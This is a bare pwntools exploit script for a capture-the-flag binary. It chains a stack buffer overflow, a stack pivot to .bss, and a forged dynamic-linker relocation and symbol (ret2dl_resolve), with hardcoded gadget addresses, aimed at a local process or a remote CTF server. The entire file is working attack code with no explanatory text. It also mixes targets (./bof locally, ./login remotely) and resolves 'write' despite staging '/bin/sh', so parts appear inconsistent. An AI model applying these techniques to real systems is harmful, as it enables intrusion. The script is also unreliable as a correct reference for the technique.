#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import sys
if len(sys.argv) < 2:
	p = process("./bof")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./bof")
else:
	p = remote("pwnable.kr","9003")
	elf = ELF("./login")
	system = 0x08049284
	input_addr = 0x811eb40

vlun_addr = 0x080484EB
ppp_ret = 0x08048619
bss_addr = 0x0804A040
junk_size = 0x260
base_stage = bss_addr + junk_size
leave_ret = 0x08048458
popebp_ret = 0x0804861b

#gdb.attach(io,"b *0x08048509")
payload = 0x6c*"a" + "junk" + p32(elf.plt["read"]) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) + p32(popebp_ret) + p32(base_stage) + p32(leave_ret)
payload = payload.ljust(0x100,"\x00")
p.sendafter("Welcome to XDCTF2015~!\n",payload)

cmd = "/bin/sh"
plt_0 = 0x08048380
index_base = 0x08048330
dynsym = 0x080481D8
dynstr = 0x08048278
write_index = 0x20
st_name = 0x4c
st_name_base = 0x08048278
name_index = (base_stage+90) - st_name_base
index_offset = (base_stage + 0x20) - index_base
#fake_reloc = p32(elf.got["write"]) + p32(0x607)
fake_sym_addr = base_stage + 0x30
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dymsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dymsym << 8) | 0x7
fake_reloc = p32(elf.got["write"]) + p32(r_info)
fake_sym = p32(name_index) + p32(0) + p32(0) + p32(0x12)


payload2 = "AAAA" + p32(plt_0) + p32(index_offset)
payload2 += "junk" + p32(1) + p32(base_stage+80) + p32(len(cmd))
payload2 = payload2.ljust(0x20,"\x00")
payload2 += fake_reloc
payload2 = payload2.ljust(0x30,"\x00")
payload2 += "\x00" * align
payload2 += fake_sym
payload2 = payload2.ljust(80,"\x00")
payload2 += cmd + "\x00"
payload2 = payload2.ljust(90,"\x00")
payload2 += "write"
payload2.ljust(100,"\x00")
p.send(payload2)

p.interactive()
	
